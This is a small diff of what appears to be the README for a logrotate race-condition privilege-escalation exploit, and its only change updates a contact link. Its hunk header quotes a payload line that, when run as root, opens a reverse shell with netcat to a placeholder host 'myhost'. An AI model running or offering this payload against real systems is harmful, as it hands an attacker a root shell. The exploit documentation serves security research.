@@ -42,6 +42,6 @@ echo "if [ `id -u` -eq 0 ]; /bin/nc -e /bin/bash myhost 3333 &; fi" > payloadfil
   - Wolfgang Hotwagner
 
 ## Contact
-  - https://tech.feedyourhead.at
+  - https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges
 
 
